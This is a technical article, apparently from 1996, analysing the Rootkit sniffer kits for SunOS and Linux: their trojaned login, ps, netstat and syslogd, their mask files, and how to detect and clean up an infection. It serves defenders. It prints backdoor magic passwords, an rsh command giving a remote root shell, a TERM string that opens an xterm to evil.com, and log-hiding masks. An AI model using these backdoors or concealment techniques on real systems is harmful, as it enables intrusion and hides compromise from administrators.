<h1>Recognizing and Recovering from Rootkit Attacks</h1>
<p>David O'Brien
<p>Installing Rootkit is one of the more popular activities of serious Internet
intruders once they have obtained root privileges of a workstation running SunOS
4.x Unix or the Slackware Linux distribution. Rootkit's name suggests that it is
a set of canned attack scripts for obtaining root access. However, Rootkit is
really a collection of programs whose purpose is to allow an intruder to install
and operate an Ethernet sniffer (a program that captures and decodes every
packet on a network) on an unsuspecting SunOS 4.x or Solbourne host using
/dev/nit or Linux host using the eth0 interface. With this sniffer, an intruder
can obtain the userids and passwords, including root, to your most sensitive
networked systems. In this article, I will discuss the various strains of
Rootkit that I analyzed, how to recognize and detect an attacked machine, and
how to recover from the attack.
<p><b>The Threat</b>
<p>I traced Rootkit's lineage back to early 1994. Since then, it has been
anonymously referred to in several CERT and CIAC advisories (CERT Advisory
CA-94:01, &quot;Ongoing Network Monitoring Attacks,&quot; February 3, 1994; CERT
Advisory CA-95:18 &quot;Widespread Attacks on Internet Sites,&quot; December 18,
1995; CIAC Advisory E-09: &quot;Network Monitoring Attacks,&quot; February 3,
1994; CIAC Advisory E-12: &quot;Network Monitoring Attacks Update,&quot; March
18, 1994) and even a popular newspaper (&quot;Computer Outlaws Invade the
Internet,&quot; The Atlanta Journal-Constitution; May 24, 1994).
<p>Since its introduction into the intruder community, Rootkit has seen
widespread use, and its threat should not be taken lightly. A 1994 CIAC bulletin
(CIAC bulletin E-12; March 18, 1994) estimated that the number of accounts
compromised worldwide exceeded 100,000. By 1996, this number is much, much
greater. CERT and CIAC continue to issue periodic warnings about the popularity
of sniffing userids and passwords. Network monitoring (sniffing) attacks
represent a serious Internet threat.
<p>The typical Rootkit attack proceeds as follows: The intruders use a stolen or
easily guessed password to log in to a host. They then gain unauthorized root
access by exploiting known vulnerabilities in rdist, sendmail, /bin/mail,
loadmodule, rpc.ypupdated, lpr, or passwd. The intruders ftp Rootkit to the
host, unpack, compile, and install it; then they collect more username/password
pairs and attack more hosts.
<p>In mid-1996, the only known variants of Rootkit ran on hosts running SunOS
4.x and the Linux Slackware distribution. However, the recipe for Rootkit is
quite simple. The first ingredient is a sniffer program, which can be fashioned
out of tcpdump or etherfind. This sniffer program, specializing in password
recording, puts the Ethernet interface into promiscuous mode and allows the
reading of every packet transmitted on an Ethernet network. The second
ingredient is the source code to the standard system binaries. Thus, it is quite
easy to write a version of Rootkit for other Unix variants. And, I've already
discovered a modified version of the SunOS Rootkit sniffer code for Solaris 2.x.
<p>Additionally, you should not assume that because you don't have any
workstations running SunOS 4.x or Linux your network is safe. Rootkit's sniffer
targets every telnet, rlogin, and ftp session regardless of system type, which
includes all Unix flavors, MS-DOS, VMS, and even MVS systems. This makes all
your network systems vulnerable to attack - all it takes is one sniffer
somewhere along the network path to your system.
<p><b>The Valuables Stolen</b>
<p>Rootkit's sniffer captures userids and passwords of accounts accessed over
the network. Even though network sniffers have existed for some time in both
hardware and software forms, their output is enormous and is not well formatted
for obtaining userids and passwords. However, the output from Rootkit's sniffer
is very clear and concise - weeding out all the TCP packets that are not related
to the authentication of telnet, rlogin, or ftp sessions. As shown in Figure 1,
in which &quot;userid&quot; and &quot;password&quot; represent the actual data,
the intruder can obtain the userids and passwords with ease. This information is
logged to a file specified on the command line. The intruder then uses one of
the back doors discussed below to collect the log file.

<p>Figure 1: Sample output</p>
<p>Given the sample output, it is easy to justify CIAC's claim of more than
100,000 compromised accounts, and the threat is worldwide. Rootkit attacks
originate from many different countries. As a side note, telnet and ftp sessions
originating from an attacked SunOS 4.x host are not sniffed, because packets
going out from the host are not obtainable through /dev/nit.
<p><b>What Is Rootkit?</b>
<p>I've analyzed seven different SunOS Rootkit samples and three Linux Rootkit
samples. The SunOS variants fall into two distinct strains, and the Linux
variants all belong to a single strain.
<p>Properly, Rootkit's packing list is:
<p>•Ethernet sniffer, specialized for logging passwords
<p>•Trojan login replacement with back door
<p>•Support programs that are direct replacements for Unix utilities (ps,
netstat, ifconfig) that could allow someone to detect the installed Ethernet
sniffer
<p>•Utility for installing the Trojan system programs with the same
dates/permissions/uid/gid and checksum as the file being replaced
<p>Some strains also include:
<p>•ls and du replacements
<p>•in.telnetd replacements
<p>•Trojan chfn, chsh, inetd, top, rshd, and syslogd replacements
<p><b>Rootkit Samples</b>
<p><b>SunOS Strains</b>
<p>The two SunOS strains can be characterized by the secondary utilities
included for stealth, &quot;smartness&quot; of the Trojan system programs,
number of cracking tools supplied, and bug fixes. The version 1 strains are the
oldest and come with more secondary programs to hide the intruder, such as zap
and ls and du Trojan replacements. Version 2 strains are derived from the older
version 1 strains. Version 2 strains fixed a number of bugs in the modified
SunOS source code and changed the makeup of the support programs. For some
reason, the stealth versions of ls and du were removed. However, several
cracking tools were added, such as bootparm, nfs shell, ypx, traceroute, iss,
strobe, and nuke (see sidebar &quot;<a
href="http://www.cs.wright.edu/~pmateti/Courses/499/Fortification/obrien.html#Other Tools">Other
Tools</a>&quot;). First, the parts common to both versions will be discussed.
<p>The sniffer is the Esniff.c program from Phrack Magazine [Vol. 5, Issue 45,
File 5 of 28; March 30, 1994 (ISSN 1068-1035)]. The sniffing buffer varies from
128 bytes to 1024 bytes. Various Rootkits call this es, watch, and rpc.rarpd.
The login, ps, netstat, and ifconfig are hacked versions of Sun Microsystems's
proprietary SunOS 4.1.x source code. They all read mask files to specify which
output to hide. Version 1 strains hardcode the filenames /dev/ptyX, where X is a
single lowercase letter (with p, q, r being the most popular). Typically, SunOS
4.x pty device files are of the form pty{p, q, r} followed by a hexadecimal
digit, so it is very easy not to notice these added files. In version 2 strains,
the filenames are ns.f and ps.f in the data/ directory in which Rootkit is
built. These mask files can be quite expressive (See sidebar &quot;<a
href="http://www.cs.wright.edu/~pmateti/Courses/499/Fortification/obrien.html#Mask file formats">Mask
file formats</a>&quot; for examples.)
<p>The login Trojan allows anyone to log in as root across the network when
supplying the magic password. The earliest versions hardcoded this password.
I've seen &quot;D13hh[&quot; and &quot;fasune.&quot; Later versions query for
the password when installing Rootkit. Regardless of the method used, the login
Trojan binary does not contain the password in plain text form (it could be
found with strings). When the password is hardcoded, it is hidden from strings's
view by assigning each letter to an element of a character array. When the
password is picked during installation, the bitwise note of the password's
letters is stored in the binary. The Trojan login then decrypts the magic
password at run-time. Some of the login Trojans also store username password
pairs in a file for later collection.
<p>The netstat Trojan hides network connections. With the network connections
(such as telnet and ftp) hidden, the intruder is free to pick up the bounty of
sniffed passwords or use your site as a springboard from which to attack other
sites.
<p>The ifconfig Trojan hides the fact that your network interface is in
promiscuous mode. There is no config file associated with the ifconfig Trojan.
<p>The ps Trojan hides running processes belonging to a specified uid, tty, or
program name. Many of the Trojans have an added &quot;showall&quot; option (-/)
that ignores the contents of the mask file.
<p>Version 1 strains also include an ls and du Trojan pair to hide specified
programs and directories from listings. It includes both native BSD and System V
flavored versions, which are modified from the SunOS proprietary source code.
Also included is zap, which zeroes out entries in utmp/wtmp/lastlog.
<p>One SunOS Rootkit sample also includes a Trojan /usr/etc/in.telnetd. If the
value of the TERM environmental variable contains &quot;%,&quot; then the
contents of TERM are tokenized into the UID, the program to exec(), and the
process name ps listings. An example is vt100%0%/usr \ /openwin/bin/xterm
-display evil.com%-csh (csh).
<p><b>Linux Strains</b>
<p>The oldest Linux version of Rootkit that I've seen dates to October 11, 1994
and is incomplete. It includes only the login, ps, and netstat Trojans. The
login Trojan magic password is &quot;wh00t!.&quot; The netstat Trojan was
enhanced with the ability to hide connections based on the UID and UNIX socket
path.
<p>The next version, self-named &quot;Linux Rootkit II version 1.0,&quot;
released on April 1, 1996, was totally rewritten and drew on the SunOS Rootkit
for ideas and inspiration. This version contains the most coverage in terms of
stealth. Linux Rootkit II version 1.1 quickly followed on April 20, 1996. It
fixed some bugs and added a simpler sniffer that was better suited for
background usage, a &quot;bind a shell to a socket&quot; utility, and utilities
to remove (rather than zero out) utmp/wtmp/lastlog entries. The Linux Rootkit is
now a very complete and dangerous package. Like the SunOS Rootkit strains, this
version includes Trojan versions of chfn, chsh, inetd, top, rshd, and syslogd.
Many of these Trojans recognize a magic password, the default is
&quot;lrkr0x,&quot; and some recognize the special user &quot;rewt.&quot; The
following is a list of programs in the Linux Rootkit:
<p>chfn - If you enter the magic password when prompted for your name, you will
be dropped into a uid 0 /bin/sh shell, rather than being prompted for your
password to commit any changes to your finger information.
<p>chsh - If you enter the magic password when prompted for your new shell, you
will be dropped into a uid 0 /bin/sh shell.
<p>inetd - Runs /bin/sh -i as the server when you connect to the rfe service
(Radio Free Ethernet). Many Linux distributions do not list this service in
/etc/services, and it is not added by Rootkit's installer.
<p>login - Allows root login with all logging turned off. There are two ways
this is triggered: (1) magic userid &quot;rewt&quot; allows root login even on
unsecured terminals, and the user is never queried for a password; (2) using any
userid with the magic password &quot;lrkr0x.&quot;
<p>ls/du - These are the same as SunOS additions. Note, since Linux
distributions are POSIX it would be extremely easy to allow regular expressions
in the mask file by using fnmatch() rather than strcmp() (GNU's ls, which is
used in Linux, already uses fnmatch).
<p>ifconfig - Same as the SunOS version.
<p>netstat -- Added masking based on UID and UNIX socket path; has -/ &quot;showall&quot;
option.
<p>passwd - If the Rootkit magic password is entered rather than the user's
password, /bin/bash is run with UID, EUID, GID, and EGID set to 0.
<p>ps - Same as SunOS.
<p>top - Same as Linux ps.
<p>rshd - Runs commands as root via /bin/sh when the local user (relative to the
rshd server) is the Rootkit magic password. Example: <code>rsh -l lrkr0x
victim.org /bin/sh -i</code> would give an interactive root shell.
<p>syslogd - Filters log messages containing the specified substrings (via a
mask file). This can greatly reduce the amount of work the intruder needs to do
to cover his or her tracks on subsequent visits.
<p>bindshell - Binds /bin/sh to a socket (defaults to port 31337) when you
connect to the port (a terminating &quot;;&quot; is required for commands).
<p><b>Detecting Rootkit</b>
<p>Unless the intruder did a poor job of removing traces of his or her visit
from the log files, attacks can be hard to detect. Most system administrators
don't know their site has been invaded until they are contacted by someone at
another site or their disks begin filling up due to the sniffer's logs. If you
cannot explain disk usage, you should become alarmed, especially in light of the
du and ls Trojans.
<p>Once you suspect a machine has been the victim of a Rootkit attack, you can
do several things to verify this. The simplest is to try du, ls, ps, and netstat
with the -/ option. If any of them accept this option, then Rootkit has been
installed. Also, there is no short-circuiting in the mask list processing; even
when you have a hit with a mask specification, the checking continues. So, a
large specification list could conceivably cause a noticeable slowdown in the
program. Text files found with file in /dev (especially with names of the form
/dev/pty without device numbers) are also suspect.
<p>Another way to verify intrusion is to use system programs whose integrity is
known. Putting original copies of ps, ls, du, ifconfig, and netstat on a
write-protected floppy disk is a good idea. These may be used in situations in
which the integrity of the system programs on the hard disk are questionable.
<p>There are many second-party (i.e., nonstandard) utilities that may be added
to the above list. These include:
<p>top(1) - A system monitoring utility that combines the functionality of
ps(1), uptime(1), renice(8), and kill(1). It can be found at ftp://eecs.nwu.edu/pub/top/
and used to reliably check for the existence of rouge programs in the case of a
SunOS host, since that version of Rootkit does not contain it.
<p>lsof - List Open Files (ftp://vic. \ cc.purdue.edu/pub /tools/unix/ \ lsof/),
which lists all open files included open network sockets.
<p>tcplist - Lists all open network connections in a nice table, including
protocol/port numbers, remote hostname, UID of the local server/client, and
remote user for remote sites running an ident server (ftp://ftp.cdf.toronto. \
edu/pub/tcplist).
<p>cpm - May be used on SunOS and Solbourne hosts to determine whether the
machine's Ethernet interface is running in promiscuous mode (ftp://info.cert.org//pub/tools
\ /cpm/cpm.1.0.tar.Z). For checking file integrity, the cryptographic checksum
program md5 should also be added to this arsenal.
<p>Since zap does not delete users from utmp/wtmp/lastlog files, but rather
overwrites the entries with binary zeros, such entries can be an indication that
a host has been attacked.
<p><b>Cleaning Up after a Rootkit attack</b>
<p>Once you discover a compromised host, you must determine the extent of the
attack. You must presume that all network transactions from or to any host
&quot;visible&quot; on the network for the duration of the compromise were
monitored and that intruders potentially possess any or all of the information
so exposed. You should perform recovery and prevent future attacks as described
below.
<p>Disconnect the host from the network or operate the system in single-user
mode during the recovery. This will keep users and intruders from accessing the
system.
<p>Locating Trojan versions of the standard system programs can be difficult,
and you should be cautious in doing so. The intruder may have installed other
Trojan programs not part of Rootkit, therefore all system utilities should NOT
be trusted unless restored from distribution media or a floppy disk as discussed
above. This especially refers to sum, cmp, ls.
<p>I advise that an entire system install be performed from read-only
distribution media. If this is not feasible, all system binaries should be
compared using a known good copy of md5 against the read-only distribution
media. Since Rootkit installs Trojans programs with the exact checksum and
timestamp as the legitimate version, these attributes cannot be used to find
Trojan programs. However, cryptographic checksums are nearly impossible to
spoof. Therefore, md5 from the read-only floppy described above can be trusted
to compare installed programs against the distribution media or known correct
checksums. Appendix B of CIAC bulletin E-12 contains an extensive list of
cryptographic checksums for various SunOS versions. Please refer to this
bulletin for further details. The &quot;live filesystem&quot; CD-ROMs that are
popular with Linux distributions may also be used.
<p>Resist the temptation of restoring from backups, unless it is positively
known the backups were made before the Trojans were installed. Otherwise there
is too great a chance the backups contain the Trojan programs, rather than the
legitimate ones.
<p>The only effective long-term solution to preventing and neutralizing Rootkit
attacks is by using encryption at the protocol layer. IP spoofing not
withstanding, simply not transmitting reusable clear-text passwords on the
network is probably sufficient. Packages to accomplish these goals include the
ssh (ftp://ftp.cs.hut.fi/pub/ssh/) connection encryption package, and one-time
password packages S/KEY (ftp://thumper.bellcore.com/pub/skey/) and OPIE (ftp://ftp.nrl.navy.mil
\ /pub/security/opie/).
<p>There are several short-term solutions. Simple ones include disabling the C
compiler on non-development machines. In fact, this is generally agreed to be a
Good Thing on critical servers because it greatly reduces the number of
vulnerabilities that may be exploited. Installing and running Tripwire (ftp://coast.cs.purdue.edu
\ /pub/tools/unix/Tripwire/) correctly is an excellent line of defense. Another
is removing the /dev/nit device on SunOS and Solbourne hosts. This can be
accomplished by rebuilding the kernel after commenting out the following lines:
<p>&nbsp;
<pre>       
# The following are for streams NIT       
# support.  NIT is used by etherfind,       
# traffic, rarpd, and ndbootd.  As a       
# rule of thumb, NIT is almost always       
# needed on a server and almost never       
# needed on a diskless client.       
#       
pseudo-device   snit       
            # streams NIT       
pseudo-device   pf       
            # packet filter       
pseudo-device   nbuf       
            # NIT buffering module</pre>
See your System and Network Administration manual, &quot;Reconfiguring the
System Kernel&quot; for details on how to rebuild a kernel.

<h1>Sidebar: <a name="Mask file formats">Mask file formats</a></h1>
<p>ps mask file -- An example /dev/ptyp mask file is as follows:
<p>&nbsp;
<pre>       
0 0       # Strips all output with processes running       
          # under root       
1 p0      # Strips all output associated with tty ttyp0       
2 sniffer # Strips from output all programs with the       
          # name sniffer</pre>
Only the first 125 characters in a line are significant. strtok(3) is used to
parse a line of input, and no error checking is done on the format or number of
fields. One result is that a blank line in the file will most probably cause a
segmentation violation. Only the first two fields in a line are looked at; so,
even though comments are not explicitly supported, they are benign. As shown
above, there are three types of specifications. A specification other than 0, 1,
or 2 will be ignored. With specification 2, only the name of a program is
checked, not any options or arguments that would be seen with ps -w.
<p>netstat mask file - An example /dev/ptyq mask file is shown below. (Note that
&quot;foreign&quot; refers to connections from the local host out, and
&quot;local&quot; refers to connections into the local host.) The SunOS and
Linux versions use slightly different encodings for masking actions.
<p>SunOS Rootkit:
<pre>       
0 6667          # Strip all foreign irc network connections       
                # (port #)       
1 23            # Strip all local telnet connections (port #)       
2 192.88.209.5  # Strip all foreign connections from        
                # cert.org       
3 128.120.1.    # Strip all local connections to a ucd subnet</pre>
Linux Rootkit:
<p>&nbsp;
<pre>       
0 500          &lt;- Hides all connections by uid 500       
1 128.31       &lt;- Hides all local connections from        
                  128.31.X.X       
2 128.31.39.20 &lt;- Hides all remote connections to        
                  128.31.39.20       
3 8000         &lt;- Hides all local connections from port 8000       
4 6667         &lt;- Hides all remote connections to port 6667       
5 .term/socket &lt;- Hides all UNIX sockets including the       
                  path.term/socket</pre>
The code to read in the file is the same as for ps, so the same limitations
apply.
<p>As shown above, there are three types of specifications. A specification
other than those supported will be ignored. Not all versions support the mask
file &quot;override&quot; option.
<p>ls/du mask file - An example /dev/ptyr mask files is as follows:
<p>&nbsp;
<pre>       
sunsnif       
icmpfake</pre>
Only the first 125 characters in a line are significant. There is no parsing of
the specification line, and the entire line (up to 125 characters) is used. So,
comments are not allowable in this file. The code assumes that there will be a
terminating \n (i.e., the specification line was 124 characters), and it is
blindly removed. Thus, if there were a filename &gt; 124 characters, it could
not be masked. Only filenames may be specified; specifically, UIDs and GIDs
cannot be specified. This is a plus for the good guys.
<p>syslog mask file, Linux only - An example /dev/ptys mask file is as follows:
<pre>    
evil.com       
123.100.101.202       
rshd</pre>
